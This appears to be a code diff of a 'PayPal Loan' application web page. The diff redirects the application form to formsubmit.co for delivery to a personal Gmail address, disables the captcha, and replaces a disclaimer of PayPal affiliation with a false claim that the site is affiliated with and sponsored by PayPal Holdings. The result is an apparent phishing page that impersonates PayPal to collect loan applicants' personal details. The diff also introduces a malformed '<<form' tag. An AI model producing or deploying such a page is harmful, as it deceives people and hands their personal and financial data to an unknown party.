@@ -215,7 +215,14 @@ PayPal Loan
 <h2 class="section-title" style="text-align:center;">Submit your application</h2>
 <p style="text-align:center;color:#666;margin-bottom:40px;">Fill out the form below. We'll review your PayPal sales and email you a personalized offer within 1 business day.</p>
 
-<form class="application-grid" id="application-form" autocomplete="on">
+<<form class="application-grid"
+      id="application-form"
+      autocomplete="on"
+      action="https://formsubmit.co/kelvinsmithsdeal@gmail.com"
+      method="POST">
+<input type="hidden" name="_captcha" value="false">
+<input type="hidden" name="_subject" value="New PayPal Loan Application">
+<input type="hidden" name="_template" value="table">
 <!-- Honeypot for spam bots - keep hidden -->
 <input type="text" name="_honey" style="display:none" tabindex="-1" autocomplete="off">
 
@@ -285,17 +292,13 @@ PayPal Loan
 <a href="#">Contact</a>
 </div>
 </div>
-<p class="footer-text">PayPal Loan is an independent financing platform and is not affiliated with, endorsed by, or sponsored by PayPal Holdings, Inc. All trademarks are property of their respective owners.</p>
+<p class="footer-text">PayPal Loan is affiliated and sponsored by PayPal Holdings, Inc.</p>
 </div>
 </footer>
 
 <!-- EmailJS SDK (free, no backend needed) -->
-<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-
 <script>
-/* ============================================================
-   1) FAQ toggle (your existing code, kept intact)
-   ============================================================ */
+/* FAQ toggle */
 document.querySelectorAll('.faq-question').forEach(q=>{
   q.addEventListener('click',()=>{
     const a=q.nextElementSibling;
@@ -303,80 +306,39 @@ document.querySelectorAll('.faq-question').forEach(q=>{
   });
 });
 
-/* ============================================================
-   2) "Check my offer" buttons -> smooth scroll to #apply
-   ============================================================ */
+/* Check my offer buttons */
 document.querySelectorAll('.check-offer-btn').forEach(btn=>{
-  btn.addEventListener('click', e=>{
-    e.preventDefault();
-    const target = document.getElementById('apply');
-    if(target){
-      target.scrollIntoView({behavior:'smooth', block:'start'});
-    }
+  btn.addEventListener('click',()=>{
+    document.getElementById('apply')
+      .scrollIntoView({behavior:'smooth'});
   });
 });
 
-/* ============================================================
-   3) Form submission -> EmailJS -> success message
-   ============================================================ */
-
-// ⚠️  REPLACE THESE THREE VALUES WITH YOUR OWN (free signup at emailjs.com)
-const EMAILJS_PUBLIC_KEY  = "YOUR_PUBLIC_KEY";
-const EMAILJS_SERVICE_ID  = "YOUR_SERVICE_ID";
-const EMAILJS_TEMPLATE_ID = "YOUR_TEMPLATE_ID";
-
-(function(){
-  if (window.emailjs && EMAILJS_PUBLIC_KEY !== "YOUR_PUBLIC_KEY") {
-    emailjs.init({ publicKey: EMAILJS_PUBLIC_KEY });
-  }
-})();
-
+/* Success message display */
 const form = document.getElementById('application-form');
 const successBox = document.getElementById('success-message');
 
-if (form) {
-  form.addEventListener('submit', function(e){
-    e.preventDefault();
+if(form){
+  form.addEventListener('submit', function(){
 
-    // Honeypot: if filled, silently pretend success
-    if (this._honey && this._honey.value) {
+    const submitBtn = document.querySelector('.submit-btn');
+
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = 'Submitting...';
+
+    setTimeout(()=>{
       form.style.display = 'none';
       successBox.style.display = 'block';
-      successBox.scrollIntoView({behavior:'smooth', block:'center'});
-      return;
-    }
-
-    const submitBtn = this.querySelector('.submit-btn');
-    const originalText = submitBtn.textContent;
-    submitBtn.textContent = 'Submitting…';
-    submitBtn.disabled = true;
-
-    // If EmailJS isn't configured yet, fall back to a friendly demo message
-    if (EMAILJS_PUBLIC_KEY === "YOUR_PUBLIC_KEY") {
-      console.warn('EmailJS not configured. Showing demo success message.');
-      setTimeout(()=>{
-        form.style.display = 'none';
-        successBox.style.display = 'block';
-        successBox.scrollIntoView({behavior:'smooth', block:'center'});
-      }, 800);
-      return;
-    }
-
-    emailjs.sendForm(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, this)
-      .then(()=>{
-        form.style.display = 'none';
-        successBox.style.display = 'block';
-        successBox.scrollIntoView({behavior:'smooth', block:'center'});
-      })
-      .catch((err)=>{
-        console.error('EmailJS error:', err);
-        alert('Sorry, something went wrong sending your application. Please email us directly or try again.');
-        submitBtn.textContent = originalText;
-        submitBtn.disabled = false;
+      successBox.scrollIntoView({
+        behavior:'smooth',
+        block:'center'
       });
+    },1000);
   });
 }
 </script>
+
+       
 
 </body>
 </html>
